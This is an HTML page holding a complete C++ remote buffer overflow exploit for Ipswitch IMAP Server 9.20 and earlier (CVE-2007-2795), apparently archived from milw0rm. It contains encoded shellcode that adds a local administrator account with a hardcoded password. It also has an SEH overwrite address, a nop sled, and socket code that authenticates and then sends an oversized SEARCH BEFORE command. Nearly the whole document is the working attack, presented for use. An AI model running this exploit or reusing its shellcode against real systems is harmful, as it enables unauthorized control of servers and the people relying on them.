<html><head><title>IPSwitch IMAP Server <= 9.20 Remote Buffer Overflow Exploit</title></head><pre>/* Ipsbitch.cpp vs Ipswitch IMAP 
 * Tested on: Windows 2000 SP4
 * Ref: CVE-2007-2795
 *
 * Author: Dominic Chell &lt;dmc@deadbeef.co.uk&gt;
 * Found this half written on a VM so decided to finish it.
 *
 * Payload adds a local admin account USER=r00t PASS=r00tr00t!!
 *
 */

#include &quot;stdafx.h&quot;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;errno.h&gt;
#include &lt;string.h&gt;
#include &quot;winsock2.h&quot;

#pragma comment(lib, &quot;ws2_32&quot;)

#define usage(){ (void)fprintf(stderr, &quot;Ipsbitch vs Ipswitch IMAP &lt;=v9.20\n(C) dmc &lt;dmc@deadbeef.co.uk&gt;\n\nExample: ipsbitch.exe [ip] [port] [user] [password]\n&quot;);}
#define error(e){ (void)fprintf(stderr,&quot;%s\n&quot;,e); return -1;}

// USER=r00t PASS=r00tr00t!!
// Bad Chars = '\x00\x0a\x0d\x0b\x09\x0c\x20'
// Encoded with shikata ga nai
char shellcode[] =
	&quot;\xda\xd4\x29\xc9\xb8\xb3\xfe\x8b\x54\xd9\x74\x24\xf4\xb1\x32&quot;
	&quot;\x5f\x83\xef\xfc\x31\x47\x14\x03\x47\xa7\x1c\x7e\xa8\x2f\xa4&quot;
	&quot;\x81\x51\xaf\xae\xc7\x6d\x24\xcc\xc2\xf5\x3b\xc2\x46\x4a\x23&quot;
	&quot;\x97\x06\x75\x52\x4c\xf1\xfe\x60\x19\x03\xef\xb9\xdd\x9d\x43&quot;
	&quot;\x3d\x1d\xe9\x9c\xfc\x54\x1f\xa2\x3c\x83\xd4\x9f\x94\x70\x11&quot;
	&quot;\x95\xf1\xf2\x46\x71\xf8\xef\x1f\xf2\xf6\xa4\x54\x5b\x1a\x3a&quot;
	&quot;\x80\xef\x3e\xb7\x57\x1b\xb7\x9b\x73\xdf\x04\x7c\x4d\x29\xea&quot;
	&quot;\xd5\xc9\x5e\xac\xe9\x9a\x21\x3c\x81\xed\xbd\x91\x1e\x65\xb6&quot;
	&quot;\x60\xd8\xf5\x06\x18\x49\x92\x76\x56\x6d\x3d\x1f\xfe\x90\x4b&quot;
	&quot;\xd1\xa9\x93\xab\x8d\x38\x08\x1a\x37\xba\xb5\x42\x98\x59\x16&quot;
	&quot;\xed\x83\xe9\x76\x84\x38\x74\x05\x46\xcd\x46\xd9\xf2\x11\xd4&quot;
	&quot;\x29\xcb\x25\x6a\x7a\x1b\xb2\xab\x5b\x7b\x15\xea\xdf\x3f\x49&quot;
	&quot;\xca\xf9\x9f\xe7\x77\x72\xc0\x9b\x18\x19\x61\x08\x81\xaf\x0e&quot;
	&quot;\xa5\x3d\x70\x90\x21\xd0\x19\x7c\xc3\x59\xae\xf2\x72\xe9\x21&quot;
	&quot;\x81\x07\x31\xcc\x55\xd8\x45\x10\xb9\x59\xe1\x14\xc5\x53&quot;;

char *seh = &quot;\xC4\x2A\x02\x75&quot;;
//ws2help.dll - 0x75022AC4 - pop/pop/ret
char *nextseh = &quot;\xeb\x10\x90\x90&quot;;
// short jmp nop nop

int main(int argc, char *argv[])
{
	SOCKET s;
	struct fd_set mask;
	struct timeval timeout; 
	struct sockaddr_in server;

	char user[20], pass[20];
	char payload[2048];
	char recvbuf[1024];
	if(argc &lt; 4)
	{
		usage();
		return 0;
	}

	if((strlen(argv[3])&lt;15) &amp;&amp; (strlen(argv[4])&lt;15))
	{
		strncpy(user, argv[3], 14);
		strncpy(pass, argv[4], 14);
		user[14] = '\0';
		pass[14] = '\0';
	}
	else {
		usage();
		return 0;
	}

	int ipaddr=htonl(inet_addr(argv[1])), port=atoi(argv[2]);;

	fprintf(stderr, &quot;Ipsbitch vs Ipswitch IMAP &lt;=v9.20\n(C) dmc &lt;dmc@deadbeef.co.uk&gt;\n\n&quot;);

	char auth[50];
	memset(auth, 0, sizeof(auth));
	memset(recvbuf, 0, sizeof(recvbuf));
	strcat(auth, &quot;0 LOGIN &quot;);
	strcat(auth, user);
	strcat(auth, &quot; &quot;);
	strcat(auth, pass);
	strcat(auth, &quot;\r\n&quot;);
	strcat(auth, &quot;\0&quot;);

	memset(payload, 0, sizeof(payload));
	strcat(payload, &quot;2 SEARCH BEFORE &quot;);
	for(int i=0; i&lt;80; i++) strcat(payload, &quot;\x90&quot;);
	strcat(payload, nextseh);
	strcat(payload, seh);
	for(int i=0; i&lt;100; i++) strcat(payload, &quot;\x90&quot;);
	strcat(payload, shellcode);
	for(int i=0; i&lt;300; i++) strcat(payload, &quot;\x90&quot;);
	strcat(payload, &quot;\r\n&quot;);

	WSADATA info;
    if (WSAStartup(MAKEWORD(2,0), &amp;info)) error(&quot;Unable to start WSA&quot;);

	s=socket(AF_INET,SOCK_STREAM,0);
	if (s==INVALID_SOCKET) error(&quot;[*] socket error&quot;);
	server.sin_family=AF_INET;
	server.sin_addr.s_addr=htonl(ipaddr);
	server.sin_port=htons(port);	

	WSAConnect(s,(struct sockaddr *)&amp;server,sizeof(server),NULL,NULL,NULL,NULL);
	timeout.tv_sec=3;timeout.tv_usec=0;FD_ZERO(&amp;mask);FD_SET(s,&amp;mask);

	select(s+1,NULL,&amp;mask,NULL,&amp;timeout);
	if(FD_ISSET(s,&amp;mask))
		{
			fprintf(stderr, &quot;[*] Connecting to IMAP server\n&quot;);
			Sleep(1000);recv(s,recvbuf,200,0);
			fprintf(stderr, &quot;[*] Got banner:\n%s\n&quot;, recvbuf);
			memset(recvbuf, 0, sizeof(recvbuf));
			fprintf(stderr, &quot;[*] Authenticating...\n&quot;);
			if (send(s,auth,strlen(auth),0)==SOCKET_ERROR) error(&quot;[*] error sending auth payload&quot;);
			memset(auth, 0, sizeof(auth));
			Sleep(1000);recv(s,recvbuf,200,0);
			fprintf(stderr, &quot;[*] Received:\n%s\n&quot;, recvbuf);
			memset(recvbuf, 0, sizeof(recvbuf));
			fprintf(stderr, &quot;[*] Sending SELECT command...\n&quot;);
			if (send(s,&quot;1 SELECT INBOX\r\n&quot;,strlen(&quot;1 SELECT INBOX\r\n&quot;),0)==SOCKET_ERROR) error(&quot;[*] error sending auth payload&quot;);
			Sleep(1000);recv(s,recvbuf,200,0);
			fprintf(stderr, &quot;[*] Received:\n%s\n&quot;, recvbuf);
			memset(recvbuf, 0, sizeof(recvbuf));
			Sleep(1000);recv(s,recvbuf,200,0);
			fprintf(stderr, &quot;[*] Received:\n%s\n&quot;, recvbuf);
			fprintf(stderr, &quot;[*] Sending exploit payload...\n&quot;);
			if (send(s,payload,strlen(payload),0)==SOCKET_ERROR) error(&quot;[*] error sending exploit payload&quot;);
			memset(payload, 0, sizeof(payload));
			fprintf(stderr, &quot;[*] Now try USER=r00t PASS=r00tr00t!!\n&quot;);
			return 0;
		}
}

// milw0rm.com [2009-09-14]</pre></html>